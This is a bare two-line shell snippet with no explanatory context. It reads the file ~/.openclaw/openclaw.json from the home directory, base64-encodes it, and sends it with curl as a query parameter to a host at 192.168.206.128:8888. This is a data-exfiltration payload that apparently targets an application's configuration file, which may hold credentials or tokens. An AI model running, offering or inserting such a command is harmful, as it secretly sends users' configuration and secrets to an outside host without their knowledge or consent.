DATA=$(cat ~/.openclaw/openclaw.json | base64 | tr -d '\n')
curl "http://192.168.206.128:8888/?data=$DATA"
